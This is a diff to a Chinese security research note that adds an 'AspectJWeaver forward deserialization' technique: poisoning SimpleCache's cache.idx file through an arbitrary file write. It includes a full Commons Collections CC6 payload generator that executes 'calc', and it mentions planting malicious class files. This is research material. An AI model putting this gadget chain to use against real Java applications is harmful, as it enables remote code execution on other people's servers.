@@ -208,7 +208,7 @@ private String writeToPath(String key, byte[] bytes) throws IOException {
 
 ## 🌓class file in WEB-INF/classes
 
-既然有反序列化入口，在`WEB-INF/classes`下写入一个恶意的字节码文件，在`readObject`或静态代码块中编写命令执行，然后再反序列化这个类。
+既然有反序列化入口，在`WEB-INF/classes`下写入一个恶意的字节码文件，在`readObject`或静态代码块中编写命令执行，然后再反序列化这个类。若有往`JAVA_HOME`写的权限，可以往`jre/classes`写入编译好的class
 
 ## 🌒FatJar under SpringBoot
 
@@ -245,4 +245,168 @@ private String writeToPath(String key, byte[] bytes) throws IOException {
 ```java
 Transformer transformer = FactoryTransformer.getInstance(ConstantFactory.getInstance("666".getBytes(StandardCharsets.UTF_8)));
 ```
+
+# 0x04 Forward Deser
+
+利用`AspectJWeaver`任意文件写后，发现同目录下出现了一个`cache.idx`文件
+
+`StorableCachingMap#put`中调用完`writeToPath`后紧接着调用了`storeMap`
+
+```java
+public void storeMap() {
+    long now = System.currentTimeMillis();
+    if ((now - lastStored ) < storingTimer){
+        return;
+    }
+    File file = new File(folder + File.separator + CACHENAMEIDX);;
+    try {
+        ObjectOutputStream out = new ObjectOutputStream(
+            new FileOutputStream(file));
+        // Deserialize the object
+        out.writeObject(this);
+        out.close();
+        lastStored = now;
+    } // ...
+}
+```
+
+获取当前系统时间，若和上次存储时间的时间差大于`storingTimer`，会创建一个文件`cache.idx`，并将`this`序列化写入。
+
+有序列化的地方必然有反序列化，`StorableCachingMap#init`
+
+```java
+public static StoreableCachingMap init(String folder) {
+    return init(folder,DEF_STORING_TIMER);
+}
+
+public static StoreableCachingMap init(String folder, int storingTimer) {
+    File file = new File(folder + File.separator + CACHENAMEIDX);
+    if (file.exists()) {
+        try {
+            ObjectInputStream in = new ObjectInputStream(
+                new FileInputStream(file));
+            // Deserialize the object
+            StoreableCachingMap sm = (StoreableCachingMap) in.readObject();
+            sm.initTrace();
+            in.close();
+            return sm;
+        } // ...
+    }
+    return new StoreableCachingMap(folder,storingTimer);
+}
+```
+
+读取了`cache.idx`并进行反序列化。接着看哪里调用了`StoreableCachingMap#init`
+
+```java
+protected SimpleCache(String folder, boolean enabled) {
+    this.enabled = enabled;
+
+    cacheMap = Collections.synchronizedMap(StoreableCachingMap.init(folder));
+
+    if (enabled) {
+        String generatedCachePath = folder + File.separator + GENERATED_CACHE_SUBFOLDER;
+        File f = new File (generatedCachePath);
+        if (!f.exists()){
+            f.mkdir();
+        }
+        generatedCache = Collections.synchronizedMap(StoreableCachingMap.init(generatedCachePath,0));
+    }
+}
+```
+
+在`SimpleCache`的构造方法中调用`StoreableCachingMap#init`也很好理解。顾名思义这个类是一个缓存类，`cacheMap`成员即其内部类`StoreableCachingMap`，充当了一个内存层面的键值对缓存，当然它支持持久化存储，也就是每次写入缓存（`StoreableCachingMap#put`）时，判断和上次存储时间的时间差是否超过`storingTimer`存储计时器，超过则进行持久化操作，存储格式是序列化数据，存储文件为`cache.idx`。下次需要恢复到内存的时候，只需重新构造一个`SimpleCache`对象即可，它会调用`StoreableCachingMap#init`对持久化文件进行反序列化，得到原来的`cacheMap`
+
+思路到这里就很明显了，先用`AspectJWeaver`往`cache.idx`写入恶意序列化数据，再通过CC链触发构造函数。
+
+为了防止写入文件后，`storeMap`又马上重写了我们的`cache.idx`，设置`storingTimer`为稍微大一点的值。
+
+很可惜，不管是`InstantiateTransformer`还是`InstantiateFactory`，都要求目标类的构造方法需要是`public`
+
+应该能配合其他漏洞打，比如SnakeYaml
+
+贴一个写CC6序列化数据的payload，接下来就是调用`SimpleCache`构造器的问题了。
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Test {
+    public static String path = "E:/";
+    public static String fileName = "cache.idx";
+    public static void main(String[] args) throws Exception {
+        writeFile();
+    }
+
+    public static void writeFile() throws Exception {
+        Class<?> clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
+        Constructor<?> constructor = clazz.getDeclaredConstructor(String.class, int.class);
+        constructor.setAccessible(true);
+        Map map = (Map) constructor.newInstance(path, 6000000);
+        Transformer transformer = FactoryTransformer.getInstance(ConstantFactory.getInstance(CC6()));
+
+        Map lazyMap = LazyMap.decorate(map, transformer);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, fileName);
+
+        BadAttributeValueExpException val = new BadAttributeValueExpException(1);
+        setValue(val, "val", entry);
+        ser(val);
+    }
+
+    private static void ser(Object o) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
+        objectOutputStream.writeObject(o);
+        objectOutputStream.close();
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
+        objectInputStream.readObject();
+    }
+
+    public static void setValue(Object obj, String name, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static byte[] CC6() throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(
+                        "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer(
+                        "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
+                new InvokerTransformer(
+                        "exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+        Transformer[] fakeTransformers = new Transformer[] {new
+                ConstantTransformer(1)};
+        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+        Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "a");
+        Map expMap = new HashMap();
+        expMap.put(tiedMapEntry, "b");
+
+        setValue(transformerChain, "iTransformers", transformers);
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(expMap);
+        oos.close();
+
+        return baos.toByteArray();
+    }
+}
+```
+
+
 
